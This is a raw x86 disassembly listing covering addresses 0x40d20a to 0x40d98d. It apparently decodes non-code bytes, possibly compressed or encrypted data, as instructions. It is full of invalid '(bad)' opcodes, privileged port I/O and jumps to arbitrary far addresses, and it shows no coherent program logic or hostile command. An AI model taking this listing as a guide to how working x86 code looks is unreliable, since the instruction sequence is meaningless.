  40d20a:	jnp    0x40d1c7
  40d20c:	lea    edi,[esi]
  40d20e:	sub    edx,ecx
  40d210:	or     cl,ch
  40d212:	loop   0x40d1b8
  40d214:	xchg   ebx,eax
  40d215:	pop    ss
  40d216:	dec    ebx
  40d217:	pop    esi
  40d218:	loopne 0x40d219
  40d21a:	inc    eax
  40d21b:	int3   
  40d21c:	xchg   ebp,esi
  40d21e:	inc    eax
  40d21f:	xchg   BYTE PTR ds:0xa7ee4066,al
  40d225:	outs   dx,BYTE PTR ds:[esi]
  40d226:	in     eax,dx
  40d227:	xor    dh,BYTE PTR [edx-0x1178acde]
  40d22d:	repz mov gs,WORD PTR [edi]
  40d230:	inc    ecx
  40d231:	add    BYTE PTR [edx],0x3a
  40d234:	add    al,al
  40d236:	es cmp al,0x73
  40d239:	std    
  40d23a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d23b:	adc    eax,0xf8699afc
  40d240:	rcl    BYTE PTR [ebx-0x4d5f299c],0xf3
  40d247:	into   
  40d248:	fcomp  DWORD PTR [ebp*2+0x62d3a6d9]
  40d24f:	das    
  40d250:	pop    ss
  40d251:	lods   al,BYTE PTR ds:[esi]
  40d252:	or     DWORD PTR [ecx+0x4e],ecx
  40d255:	sub    DWORD PTR [edi],0xffffffac
  40d258:	pop    ebx
  40d259:	scas   eax,DWORD PTR es:[edi]
  40d25a:	jmp    0x6f0e:0x440e6762
  40d261:	ins    DWORD PTR es:[edi],dx
  40d262:	push   eax
  40d263:	cdq    
  40d264:	lods   eax,DWORD PTR ds:[esi]
  40d265:	imul   ebx,DWORD PTR [ecx],0x400631d7
  40d26b:	inc    esi
  40d26c:	shl    BYTE PTR [eax-0x29],0x2d
  40d270:	imul   esp,DWORD PTR [edx+esi*4+0xf642e50],0x917b5dc5
  40d27b:	lods   eax,DWORD PTR ds:[esi]
  40d27c:	into   
  40d27d:	inc    edi
  40d27e:	jmp    FWORD PTR [ecx+eax*2]
  40d281:	jp     0x40d21e
  40d283:	adc    BYTE PTR [edx-0x2e],bh
  40d286:	xchg   DWORD PTR [esi],edi
  40d288:	repz jl 0x40d275
  40d28b:	add    eax,esi
  40d28d:	pop    ecx
  40d28e:	sub    BYTE PTR [eax],dl
  40d290:	enter  0xc83b,0x75
  40d294:	push   eax
  40d295:	into   
  40d296:	mov    dl,0x3d
  40d298:	xor    eax,0xc989699b
  40d29d:	sub    ah,BYTE PTR [edx]
  40d29f:	adc    al,0x32
  40d2a1:	push   ds
  40d2a2:	mov    al,0x21
  40d2a4:	xor    eax,0x225060f5
  40d2a9:	sti    
  40d2aa:	(bad)  
  40d2ab:	jmp    0x13373618
  40d2b0:	inc    esp
  40d2b1:	inc    edx
  40d2b2:	bound  esi,QWORD PTR [edi+0x120c6bf2]
  40d2b8:	out    dx,eax
  40d2b9:	dec    esi
  40d2ba:	loope  0x40d298
  40d2bc:	add    DWORD PTR [edx+0x72dbc5a2],edi
  40d2c2:	jl     0x40d2df
  40d2c4:	cmp    edx,edi
  40d2c6:	sub    al,0x43
  40d2c8:	sbb    DWORD PTR [ebx+edi*4],edx
  40d2cb:	push   es
  40d2cc:	cmp    dl,ah
  40d2ce:	mov    ah,0x1e
  40d2d0:	lds    ecx,FWORD PTR [ebp+0x42964787]
  40d2d6:	in     eax,0x5d
  40d2d8:	fimul  WORD PTR [ebx+0x68]
  40d2db:	outs   dx,BYTE PTR ds:[esi]
  40d2dc:	mov    ebx,0x4f0c7a88
  40d2e1:	mov    al,ds:0xc2b65ee3
  40d2e6:	aas    
  40d2e7:	outs   dx,DWORD PTR ds:[esi]
  40d2e8:	mov    eax,0x87377a69
  40d2ed:	scas   al,BYTE PTR es:[edi]
  40d2ee:	hlt    
  40d2ef:	push   cs
  40d2f0:	sar    BYTE PTR [ebx+0x66],0xbe
  40d2f4:	sbb    DWORD PTR [eax+0x16079d18],esi
  40d2fa:	xchg   edi,eax
  40d2fb:	jmp    0x40d34e
  40d2fd:	fldenv [esi]
  40d2ff:	sti    
  40d300:	push   ebx
  40d301:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d302:	das    
  40d303:	in     eax,dx
  40d304:	or     eax,0xc094ead9
  40d309:	jbe    0x40d32b
  40d30b:	adc    BYTE PTR [esi+edi*8+0x43],dh
  40d30f:	push   es
  40d310:	in     al,0xb1
  40d312:	(bad)  
  40d314:	lea    edx,[esi-0x7a]
  40d317:	leave  
  40d318:	retf   0x849a
  40d31b:	pusha  
  40d31c:	xor    ebp,DWORD PTR [esi+0x1e6f7975]
  40d322:	push   ds
  40d323:	lods   al,BYTE PTR ds:[esi]
  40d324:	jmp    0x40d32c
  40d326:	adc    eax,0x41eb444c
  40d32b:	je     0x40d2ea
  40d32d:	dec    edi
  40d32e:	ud1    esp,DWORD PTR [esi-0x8]
  40d332:	sbb    edi,DWORD PTR [edx+edi*2-0x6d]
  40d336:	add    al,ch
  40d338:	cmp    BYTE PTR [ebx+0x76],dl
  40d33b:	sub    ebx,DWORD PTR [edi+0x31]
  40d33e:	mov    WORD PTR [ebx],ds
  40d340:	jns    0x40d356
  40d342:	sbb    al,dh
  40d344:	xor    BYTE PTR [edx],al
  40d346:	inc    ebp
  40d347:	jb     0x40d2fd
  40d349:	mov    ah,0x73
  40d34b:	rcl    DWORD PTR [bx+si+0x71],cl
  40d34f:	aad    0x71
  40d351:	cmp    bh,BYTE PTR [ebp+ecx*1-0x319209fa]
  40d358:	adc    esp,DWORD PTR [edi]
  40d35a:	test   BYTE PTR [edi],al
  40d35c:	popa   
  40d35d:	pop    edx
  40d35e:	inc    ecx
  40d35f:	dec    edi
  40d360:	cmovs  ebx,DWORD PTR [esi-0x2d]
  40d364:	pop    es
  40d365:	and    eax,0x15aaf33c
  40d36a:	push   eax
  40d36b:	pop    ds
  40d36c:	cld    
  40d36d:	(bad)  
  40d36e:	ficom  DWORD PTR [esi]
  40d370:	inc    esp
  40d371:	data16 jl 0x40d33d
  40d374:	mov    al,0x42
  40d376:	xchg   DWORD PTR [edx+esi*4+0x4f4bc73],ecx
  40d37d:	jg     0x40d301
  40d37f:	adc    BYTE PTR [ebp-0x51d0fa4b],bh
  40d385:	cmp    eax,0x5026dcf
  40d38a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d38b:	rol    BYTE PTR [edi-0x38],1
  40d38e:	push   eax
  40d38f:	fwait
  40d390:	(bad)  
  40d391:	xor    ch,bh
  40d393:	xchg   ebx,eax
  40d394:	mov    dh,0x1f
  40d396:	addr16 pop esi
  40d398:	xchg   edx,eax
  40d399:	sbb    edi,DWORD PTR [edi+0x4c]
  40d39c:	cwde   
  40d39d:	lods   eax,DWORD PTR ds:[esi]
  40d39e:	inc    edx
  40d39f:	daa    
  40d3a0:	jle    0x40d326
  40d3a2:	pop    ss
  40d3a3:	stos   DWORD PTR es:[edi],eax
  40d3a4:	cld    
  40d3a5:	adc    al,0xfb
  40d3a7:	aam    0xb5
  40d3a9:	mov    ah,0xc2
  40d3ab:	adc    BYTE PTR [ebx+ebp*4],al
  40d3ae:	fisub  WORD PTR [esi+0x75]
  40d3b1:	fdiv   DWORD PTR [ebp-0x599a74c8]
  40d3b7:	stos   BYTE PTR es:[edi],al
  40d3b8:	xchg   DWORD PTR [ebx-0x771b1559],ebx
  40d3be:	lods   al,BYTE PTR ds:[esi]
  40d3bf:	pusha  
  40d3c0:	not    DWORD PTR [edx+0xe]
  40d3c3:	jo     0x40d443
  40d3c5:	sub    BYTE PTR [esi-0x3b252c96],al
  40d3cb:	das    
  40d3cc:	inc    ecx
  40d3cd:	add    eax,0x4fe8c1c7
  40d3d2:	push   esi
  40d3d3:	mov    esp,0x1bd297c1
  40d3d8:	lods   al,BYTE PTR ds:[esi]
  40d3d9:	fdivp  st(4),st
  40d3db:	pop    ss
  40d3dc:	mov    ebx,0x18535e9a
  40d3e1:	xor    esi,ecx
  40d3e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3e4:	dec    bx
  40d3e6:	pop    ds
  40d3e7:	mov    ah,0x9f
  40d3e9:	rol    BYTE PTR [edx+0x6ba82436],1
  40d3ef:	mov    al,ds:0xdd24c031
  40d3f4:	stos   BYTE PTR es:[edi],al
  40d3f5:	add    BYTE PTR [edi],al
  40d3f7:	dec    ebx
  40d3f8:	imul   DWORD PTR [edx+esi*8+0x75f3e977]
  40d3ff:	mov    cl,0x4
  40d401:	(bad)  
  40d402:	sar    BYTE PTR [ecx-0x7d],cl
  40d405:	int    0x2
  40d407:	cmp    esi,0xffffffc7
  40d40a:	push   ecx
  40d40b:	aad    0x2e
  40d40d:	fdiv   QWORD PTR [ebp+0x6fefca30]
  40d413:	outs   dx,BYTE PTR ds:[esi]
  40d414:	lahf   
  40d415:	mov    cs,WORD PTR [ecx-0xd3cd45b]
  40d41b:	push   ebx
  40d41c:	jbe    0x40d3fb
  40d41e:	(bad)  
  40d41f:	dec    DWORD PTR [ebx]
  40d421:	test   eax,0x3196a9d4
  40d426:	or     edi,DWORD PTR [edx+0x3]
  40d429:	xchg   esp,eax
  40d42b:	stos   DWORD PTR es:[edi],eax
  40d42c:	add    BYTE PTR [eax],ch
  40d42e:	pop    eax
  40d42f:	push   edx
  40d430:	mov    ch,0x34
  40d432:	sbb    DWORD PTR [esi+0x23fd8af9],ebx
  40d438:	mov    esp,0xdb5fcfa4
  40d43d:	or     DWORD PTR [ebx+0x28],0x58c844d4
  40d444:	sahf   
  40d445:	push   esi
  40d446:	ffree  st(0)
  40d448:	pop    eax
  40d449:	add    al,0x4e
  40d44b:	es xchg ebp,eax
  40d44d:	imul   ebx,DWORD PTR [ecx-0x36708347],0xffffff9e
  40d454:	xchg   ebx,eax
  40d455:	(bad)  
  40d456:	fnstcw WORD PTR [ecx]
  40d458:	mov    dh,0xf4
  40d45a:	loope  0x40d460
  40d45c:	fistp  DWORD PTR [ebp-0x61182c27]
  40d462:	cmp    eax,0x19e5b0c7
  40d467:	je     0x40d412
  40d469:	and    BYTE PTR [ebp+0xca71a6c],al
  40d46f:	dec    ecx
  40d470:	add    al,0xbe
  40d472:	ror    BYTE PTR [esi-0x7f],0x14
  40d476:	cli    
  40d477:	into   
  40d478:	sub    dh,al
  40d47a:	ret    
  40d47b:	fnsave [ebx-0x58]
  40d47e:	and    edi,ebx
  40d480:	aam    0x45
  40d482:	jmp    FWORD PTR [eax-0x35a6402c]
  40d488:	sbb    bl,BYTE PTR [edi+0x1d]
  40d48b:	jo     0xe298b595
  40d491:	pop    es
  40d492:	mov    dl,0x8c
  40d494:	popf   
  40d495:	jg     0x40d4c9
  40d497:	(bad)  
  40d498:	or     ebp,DWORD PTR [edi]
  40d49a:	scas   eax,DWORD PTR es:[edi]
  40d49b:	fild   QWORD PTR [ebx-0xe0a0c6a]
  40d4a1:	test   DWORD PTR [ebx+0x49],edx
  40d4a4:	xor    dh,BYTE PTR [esi]
  40d4a6:	outs   dx,BYTE PTR ds:[esi]
  40d4a7:	pop    esi
  40d4a8:	arpl   WORD PTR [ebx-0x1c2e617c],dx
  40d4ae:	sbb    DWORD PTR [edx+0x529dc54e],esi
  40d4b4:	push   esp
  40d4b5:	jmp    0xf0abaa05
  40d4ba:	aaa    
  40d4bb:	and    DWORD PTR [ebx],edx
  40d4bd:	lods   al,BYTE PTR ds:[esi]
  40d4be:	lds    ebp,FWORD PTR [eax-0x4d72ac34]
  40d4c4:	xchg   BYTE PTR [edx-0x47],al
  40d4c7:	pushf  
  40d4c8:	or     DWORD PTR [eax+0x2ff5bdea],ebp
  40d4ce:	mov    ds:0xae1a4576,al
  40d4d3:	fimul  DWORD PTR [ebx]
  40d4d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4d6:	jns    0x40d4ea
  40d4d8:	loopne 0x40d4b5
  40d4da:	stos   DWORD PTR es:[edi],eax
  40d4db:	xchg   ecx,eax
  40d4dc:	shl    BYTE PTR [ecx],0x7f
  40d4df:	les    edi,FWORD PTR [esi+eax*4+0x1fe0599a]
  40d4e6:	mov    edx,0xe9a28138
  40d4eb:	ret    0xb35b
  40d4ee:	push   ds
  40d4ef:	cld    
  40d4f0:	fnstcw WORD PTR [ecx]
  40d4f2:	lds    ebp,FWORD PTR [edi+0x71]
  40d4f5:	or     eax,0xc744399e
  40d4fa:	xchg   esi,eax
  40d4fb:	and    DWORD PTR [ebx+esi*1-0xf975dc7],ebx
  40d502:	cli    
  40d503:	cmp    eax,0x84abeed1
  40d508:	loope  0x40d570
  40d50a:	xor    DWORD PTR [edi],eax
  40d50c:	fcom   DWORD PTR [edx-0x68adedfd]
  40d512:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d513:	xor    BYTE PTR [ebx+esi*2-0x7d],bl
  40d517:	and    DWORD PTR es:[ebp+0x6270e0f6],ecx
  40d51e:	fisttp DWORD PTR [eax+0x10]
  40d521:	sbb    eax,0x3be9ef86
  40d526:	sbb    BYTE PTR [eax-0x80],0x8c
  40d52a:	and    DWORD PTR [esi],esi
  40d52c:	mov    dh,0xd0
  40d52e:	mov    al,ds:0xb611d2a7
  40d533:	mov    dl,0x29
  40d535:	sbb    BYTE PTR [edi+0x5c],0x42
  40d539:	call   0x710f:0xf8b23652
  40d540:	fcomp  st(1)
  40d542:	loop   0x40d59a
  40d544:	inc    esp
  40d545:	sbb    dl,BYTE PTR [edi]
  40d547:	mov    esp,0xba85a47a
  40d54c:	loopne 0x40d569
  40d54e:	mov    bl,BYTE PTR [eax-0x1ce2faa5]
  40d554:	xor    BYTE PTR [ebp+0x2e54a98d],bh
  40d55a:	dec    ebx
  40d55b:	ja     0x40d4f6
  40d55d:	jbe    0x40d54e
  40d55f:	push   cs
  40d560:	push   edx
  40d561:	push   esi
  40d562:	mov    dh,0xa0
  40d564:	daa    
  40d565:	adc    ebp,DWORD PTR [ebx]
  40d567:	mov    ch,0x8e
  40d569:	push   cs
  40d56a:	test   eax,0x63c1819a
  40d56f:	jmp    0x40d596
  40d571:	mov    ebp,0x47851f3e
  40d576:	mov    ch,0x79
  40d578:	cmc    
  40d579:	adc    BYTE PTR [esi+ebp*2+0x5b],ah
  40d57d:	dec    eax
  40d57e:	ins    DWORD PTR es:[edi],dx
  40d57f:	inc    esp
  40d580:	or     bh,ah
  40d582:	mov    ebx,0xfafbdf00
  40d587:	mov    ebx,0xdf9156c5
  40d58c:	add    esp,ebx
  40d58e:	inc    esp
  40d58f:	pop    ss
  40d590:	daa    
  40d591:	push   edx
  40d592:	xchg   ebp,eax
  40d594:	xlat   BYTE PTR ds:[ebx]
  40d595:	and    eax,0x82073210
  40d59a:	mov    bl,0xf1
  40d59c:	int3   
  40d59d:	adc    al,0x31
  40d59f:	xchg   ebx,eax
  40d5a0:	xchg   ecx,eax
  40d5a1:	out    dx,al
  40d5a2:	push   eax
  40d5a3:	aad    0x5d
  40d5a5:	stc    
  40d5a6:	stos   BYTE PTR es:[edi],al
  40d5a7:	mov    ds:0xdd63d84e,al
  40d5ac:	push   0x37
  40d5ae:	xor    edi,edi
  40d5b0:	je     0x40d541
  40d5b2:	outs   dx,BYTE PTR ds:[esi]
  40d5b3:	dec    esi
  40d5b4:	out    dx,al
  40d5b5:	adc    al,BYTE PTR [esi+ecx*1]
  40d5b8:	sti    
  40d5b9:	(bad)  
  40d5ba:	ss mov ecx,0x14e5f99e
  40d5c0:	inc    esp
  40d5c1:	enter  0xbdd,0xf
  40d5c5:	sti    
  40d5c6:	pop    ecx
  40d5c7:	pop    edx
  40d5c8:	out    dx,al
  40d5c9:	pusha  
  40d5ca:	out    0xf4,al
  40d5cc:	popa   
  40d5cd:	fldenv [eax+0x3e093355]
  40d5d3:	nop
  40d5d4:	and    cl,BYTE PTR [esi+0x550b7332]
  40d5da:	test   BYTE PTR [ebx],al
  40d5dc:	test   DWORD PTR [edi-0x20],ecx
  40d5df:	(bad)  [esi]
  40d5e1:	outs   dx,DWORD PTR ds:[esi]
  40d5e2:	sub    esi,DWORD PTR [ecx+0x5ed99893]
  40d5e8:	sbb    eax,0xad78e500
  40d5ed:	scas   al,BYTE PTR es:[edi]
  40d5ee:	pop    esp
  40d5ef:	jmp    0x80afd078
  40d5f4:	out    0xb8,al
  40d5f6:	xchg   esi,eax
  40d5f7:	dec    edx
  40d5f8:	adc    eax,0x410382ff
  40d5fd:	mov    ebp,0xdf71cd6b
  40d602:	jp     0x40d662
  40d604:	inc    esp
  40d605:	add    DWORD PTR [esp+ebx*1+0x27],ebx
  40d609:	inc    ecx
  40d60a:	mov    ?,WORD PTR [ebp-0x3307f0ed]
  40d610:	pushf  
  40d611:	sbb    DWORD PTR [eax],ebx
  40d613:	dec    esi
  40d614:	push   edx
  40d615:	xor    eax,DWORD PTR [edi-0x326174c4]
  40d61b:	xlat   BYTE PTR ds:[ebx]
  40d61c:	(bad)  
  40d61d:	sti    
  40d61e:	xor    DWORD PTR [eax+0x59fa7c68],0xffffffdc
  40d625:	xor    eax,0xcde5857a
  40d62a:	adc    eax,0x52d18aa9
  40d62f:	pop    esi
  40d630:	sbb    DWORD PTR [edi+eiz*1+0x3d],esi
  40d634:	gs ffreep st(2)
  40d637:	imul   ebp,DWORD PTR [ecx+0x23],0xbe26c5ba
  40d63e:	not    BYTE PTR [edi-0x37c896b3]
  40d644:	mov    ebp,0xfec3a653
  40d649:	sub    DWORD PTR [edi-0x2dc8a8b1],esp
  40d64f:	sub    bh,cl
  40d651:	nop
  40d652:	fdivr  st(5),st
  40d654:	dec    esi
  40d655:	fs mov cl,0xa6
  40d658:	dec    esp
  40d659:	out    dx,al
  40d65a:	mov    ebx,0xfe4ed4ad
  40d65f:	mov    ecx,0x9e9e58bd
  40d664:	leave  
  40d665:	ret    
  40d666:	mov    esi,DWORD PTR [ebx]
  40d668:	jle    0x40d683
  40d66a:	push   ebx
  40d66b:	or     DWORD PTR [ecx-0x1b71799a],eax
  40d671:	push   esi
  40d672:	call   FWORD PTR [esi+0x552cbcab]
  40d678:	ficom  WORD PTR [ebp+0x4bdb0e14]
  40d67e:	jae    0x40d6d4
  40d680:	mov    WORD PTR [esi+edx*1-0x5b59568e],cs
  40d687:	or     BYTE PTR [ecx],dl
  40d689:	sti    
  40d68a:	or     al,0xe8
  40d68c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d68d:	sti    
  40d68e:	sbb    eax,0xcbaaf227
  40d693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d694:	fist   DWORD PTR ds:0x2e0b4f9
  40d69a:	shr    esi,cl
  40d69c:	out    0xfe,eax
  40d69e:	sub    bh,BYTE PTR [eax]
  40d6a0:	pop    esi
  40d6a1:	mov    al,0x40
  40d6a3:	pop    ebp
  40d6a4:	pop    eax
  40d6a5:	jae    0x40d645
  40d6a7:	pop    esi
  40d6a8:	mov    ds:0x79736340,al
  40d6ad:	imul   esp,DWORD PTR [eax],0xfffffff7
  40d6b0:	push   edi
  40d6b1:	sub    ebp,eax
  40d6b3:	ret    
  40d6b4:	popf   
  40d6b5:	test   eax,0xec8cac53
  40d6ba:	les    eax,FWORD PTR [edx-0x7]
  40d6bd:	xchg   esp,eax
  40d6be:	lds    edx,FWORD PTR [eax+0x522f7439]
  40d6c4:	mov    ch,0x71
  40d6c6:	fsubr  QWORD PTR [edi+0x3]
  40d6c9:	mov    esp,0x58e735da
  40d6ce:	xor    ah,BYTE PTR [esi+ebp*1-0x2bcecd52]
  40d6d5:	xchg   edi,eax
  40d6d6:	xor    bh,dl
  40d6d8:	mov    ah,BYTE PTR [ebx+0x75159d4d]
  40d6de:	arpl   sp,bx
  40d6e0:	pop    es
  40d6e1:	jbe    0x40d6a5
  40d6e3:	or     eax,0x9c5faaf5
  40d6e8:	xchg   edi,eax
  40d6e9:	sub    eax,DWORD PTR [edx+0x41]
  40d6ec:	add    ecx,DWORD PTR [ebp-0x38]
  40d6ef:	sbb    BYTE PTR [eax-0x7],al
  40d6f2:	xchg   edi,eax
  40d6f3:	add    al,0xbc
  40d6f5:	leave  
  40d6f6:	ja     0x40d75f
  40d6f8:	ret    
  40d6f9:	es pop esp
  40d6fb:	or     al,0x6c
  40d6fd:	and    dh,BYTE PTR [eax]
  40d6ff:	out    dx,al
  40d700:	jo     0x40d76f
  40d702:	inc    edx
  40d703:	cli    
  40d704:	imul   ecx,edx,0xfffffffd
  40d707:	mov    ds:0xe04e86c2,al
  40d70c:	mov    bh,0x5b
  40d70e:	jbe    0x40d765
  40d710:	add    DWORD PTR [ecx],esi
  40d712:	push   esp
  40d713:	sbb    bh,BYTE PTR [eax+0x4d]
  40d716:	clc    
  40d717:	pop    esi
  40d718:	test   BYTE PTR [ebx],ch
  40d71a:	and    BYTE PTR [edx],dh
  40d71c:	and    dh,BYTE PTR [edx-0x29e0844c]
  40d722:	out    0xb0,al
  40d724:	test   eax,0x6d08504a
  40d729:	mov    ah,0x8a
  40d72b:	push   ebp
  40d72c:	imul   ebx,DWORD PTR [ebp+0x7724920],0xe2b16a83
  40d736:	cld    
  40d737:	sbb    al,dl
  40d739:	call   0x2f3b8de3
  40d73e:	pop    edi
  40d73f:	popf   
  40d740:	sub    edi,ebx
  40d742:	jmp    0xeded:0x1ec82ab0
  40d749:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d74a:	add    al,0xc3
  40d74c:	mov    ds:0x461308d0,al
  40d751:	mov    esi,edx
  40d753:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d754:	rol    edi,1
  40d756:	pop    esp
  40d757:	out    0xfd,eax
  40d759:	imul   ebp,DWORD PTR [ecx],0xb6f65ccd
  40d75f:	pushf  
  40d760:	cmp    esp,ebx
  40d762:	cli    
  40d763:	adc    BYTE PTR [edx+0x2c],0x92
  40d767:	xchg   edi,eax
  40d768:	jmp    0x4f528ef7
  40d76d:	mov    ebx,0x911095e3
  40d772:	push   esp
  40d773:	pop    ss
  40d774:	sub    eax,0x4460ce75
  40d779:	xchg   edi,eax
  40d77a:	mov    eax,0x6b474d4d
  40d77f:	into   
  40d780:	retf   0xd632
  40d783:	push   esi
  40d784:	or     BYTE PTR [esi],0x4c
  40d787:	loop   0x40d750
  40d789:	push   ss
  40d78a:	lods   eax,DWORD PTR ds:[esi]
  40d78b:	push   esp
  40d78c:	sti    
  40d78d:	or     DWORD PTR [ebp+0x29],ecx
  40d790:	ret    0x6549
  40d793:	ret    0xd349
  40d796:	or     bh,cl
  40d798:	out    0x32,al
  40d79a:	xchg   esp,eax
  40d79b:	ja     0x40d7e1
  40d79d:	fidivr DWORD PTR [eax]
  40d79f:	xor    al,BYTE PTR [edx-0x59027ae3]
  40d7a5:	jecxz  0x40d799
  40d7a7:	sub    al,0x1
  40d7a9:	mov    esp,0x70f28ccc
  40d7ae:	dec    esi
  40d7af:	fbstp  TBYTE PTR [edx+0x72c23fb4]
  40d7b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7b6:	adc    ebx,DWORD PTR [ebx]
  40d7b8:	jnp    0x40d73d
  40d7ba:	mov    al,0x9d
  40d7bc:	xchg   ebx,eax
  40d7bd:	sub    bh,BYTE PTR [ebp-0x1020d9ea]
  40d7c3:	jl     0x40d793
  40d7c5:	jle    0x40d7d6
  40d7c7:	inc    DWORD PTR [esi]
  40d7c9:	inc    edi
  40d7ca:	inc    edx
  40d7cb:	and    al,0xb
  40d7cd:	jg     0x40d80c
  40d7cf:	xor    al,0xcb
  40d7d1:	mov    ebx,0x5eac48a2
  40d7d6:	sbb    eax,0xf390c539
  40d7db:	xchg   BYTE PTR [edi],al
  40d7dd:	or     DWORD PTR [ebp-0xa3e1499],esi
  40d7e3:	test   BYTE PTR [ecx],al
  40d7e5:	pushf  
  40d7e6:	cmp    eax,0x1626fc48
  40d7eb:	rol    BYTE PTR [eax-0x40],0x46
  40d7ef:	push   ebp
  40d7f0:	repz loopne 0x40d7ae
  40d7f3:	scas   eax,DWORD PTR es:[edi]
  40d7f4:	ds mov edi,0xdaafd484
  40d7fa:	dec    ecx
  40d7fb:	loope  0x40d7b5
  40d7fd:	sub    BYTE PTR [edi-0x3e],dh
  40d800:	xor    eax,0x5de9226e
  40d805:	aad    0x52
  40d807:	dec    ebp
  40d808:	sub    DWORD PTR gs:[ebx-0x539f9fa4],eax
  40d80f:	xchg   ebp,eax
  40d810:	test   eax,0xf3a40310
  40d815:	inc    eax
  40d816:	jecxz  0x40d822
  40d818:	pop    eax
  40d819:	ret    0x43ca
  40d81c:	sub    BYTE PTR [ebp+0x472d87e2],ah
  40d822:	push   edx
  40d823:	in     eax,0x17
  40d825:	aaa    
  40d826:	es inc ebx
  40d828:	push   0xa4cdc6a1
  40d82d:	sti    
  40d82e:	je     0x40d892
  40d830:	cmp    bh,0x93
  40d833:	imul   ebx,DWORD PTR [edi+0x57a02555],0x627d69d4
  40d83d:	lahf   
  40d83e:	imul   esi,edi,0x21
  40d841:	lea    ebx,[edx+0x45]
  40d844:	por    mm3,QWORD PTR [ebp-0xf]
  40d848:	ret    0xe223
  40d84b:	jge    0x40d81a
  40d84d:	push   edx
  40d84e:	scas   al,BYTE PTR es:[edi]
  40d84f:	aad    0x5b
  40d851:	stos   BYTE PTR es:[edi],al
  40d852:	mov    al,ds:0xae7bc89e
  40d857:	or     DWORD PTR [ecx+0x62],0xa4c09e33
  40d85e:	mov    edi,0x8144b911
  40d863:	cmp    DWORD PTR [edx+0x75a9962],eax
  40d869:	jb     0x40d7f6
  40d86b:	(bad)  
  40d86c:	mov    WORD PTR [ecx-0x3cd7a6cb],?
  40d872:	daa    
  40d873:	mov    ebx,0xf55e0afc
  40d878:	mov    ds:0x68d57d90,eax
  40d87d:	scas   eax,DWORD PTR es:[edi]
  40d87e:	adc    cl,BYTE PTR [eax-0xb]
  40d881:	mov    dl,0xaf
  40d883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d884:	lea    edi,[esi]
  40d886:	dec    ecx
  40d887:	(bad)  
  40d889:	xor    DWORD PTR [esi+0x5a47e2f2],ecx
  40d88f:	push   ss
  40d890:	sub    eax,0xaca2052a
  40d895:	push   eax
  40d896:	mov    ds:0x719e243,eax
  40d89b:	mov    edx,0x2e35389e
  40d8a0:	jmp    0x3e75:0xe7347eab
  40d8a7:	mov    ecx,0x67dd384f
  40d8ac:	lods   al,BYTE PTR ds:[esi]
  40d8ad:	sti    
  40d8ae:	test   eax,0xe35c6c8
  40d8b3:	mov    eax,ds:0x2db6b00a
  40d8b8:	and    edx,ebp
  40d8ba:	mov    edx,0xebfffe46
  40d8bf:	cmp    cl,BYTE PTR [edx]
  40d8c1:	nop
  40d8c2:	neg    DWORD PTR [ebp-0x9]
  40d8c5:	sar    DWORD PTR [ebp+0x1020751],cl
  40d8cb:	dec    esi
  40d8cc:	shl    DWORD PTR [edx-0x60cd29ce],0x1
  40d8d3:	iret   
  40d8d4:	imul   DWORD PTR [ecx]
  40d8d6:	clc    
  40d8d7:	xor    DWORD PTR [ebx+0x18],esp
  40d8da:	out    dx,al
  40d8db:	aaa    
  40d8dc:	bound  edx,QWORD PTR [ebp+0x44]
  40d8df:	call   0x54e4af19
  40d8e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8e5:	in     eax,dx
  40d8e6:	lods   eax,DWORD PTR ds:[esi]
  40d8e7:	into   
  40d8e8:	test   DWORD PTR [ecx-0x34],eax
  40d8eb:	mov    bh,0x6e
  40d8ed:	(bad)  
  40d8ee:	jbe    0x40d8f8
  40d8f0:	dec    esi
  40d8f1:	test   BYTE PTR [esi-0x34299ee5],ah
  40d8f7:	push   ss
  40d8f8:	ret    
  40d8f9:	enter  0xffe5,0xb8
  40d8fd:	or     dl,BYTE PTR [edi-0x686cf2a9]
  40d903:	adc    al,0x99
  40d905:	mov    DWORD PTR [edx-0x21],eax
  40d908:	or     BYTE PTR [ebx],0x1e
  40d90b:	mov    esi,0x2aeda8c5
  40d910:	inc    edi
  40d911:	mov    ah,0x58
  40d913:	mov    ss,esp
  40d915:	(bad)  
  40d916:	pop    edx
  40d917:	mov    BYTE PTR [esi+0x27],bh
  40d91a:	jmp    0x40d992
  40d91c:	and    BYTE PTR [edi],ah
  40d91e:	gs dec eax
  40d920:	fdivr  QWORD PTR [ebx+0x5ac4ae7e]
  40d926:	es pushf 
  40d928:	mov    ch,0x7a
  40d92a:	ss mov ebp,0x32e16b14
  40d930:	call   0xa7d219d5
  40d935:	retf   
  40d936:	aad    0x43
  40d938:	test   al,0x26
  40d93a:	es inc edx
  40d93c:	cld    
  40d93d:	or     edi,edx
  40d93f:	mov    ebx,0xdaae73e2
  40d944:	inc    edx
  40d945:	jle    0x40d9b9
  40d947:	jb     0x40d954
  40d949:	mov    ah,0x4a
  40d94b:	cmc    
  40d94c:	rcl    BYTE PTR [edx+0x645e1c46],1
  40d952:	dec    esp
  40d953:	out    dx,eax
  40d954:	(bad)  
  40d955:	scas   eax,DWORD PTR es:[edi]
  40d956:	arpl   sp,sp
  40d958:	std    
  40d959:	or     eax,0xf51a3efd
  40d95e:	out    dx,eax
  40d95f:	sti    
  40d960:	jno    0x40d931
  40d962:	out    0x3,al
  40d964:	inc    edi
  40d965:	aas    
  40d966:	dec    edx
  40d967:	es (bad) 
  40d969:	mov    esi,0xed988fc7
  40d96e:	inc    esi
  40d96f:	fcomp  QWORD PTR ss:[ebx]
  40d972:	push   0xe7251ffb
  40d977:	aam    0xec
  40d979:	cdq    
  40d97a:	js     0x40d9ae
  40d97c:	test   al,0x7
  40d97e:	in     eax,0x77
  40d980:	les    ecx,FWORD PTR [esi+0xaaef925]
  40d986:	fdivr  QWORD PTR ds:0xa8b8d902
  40d98c:	inc    edx
  40d98d:	pop    ebp
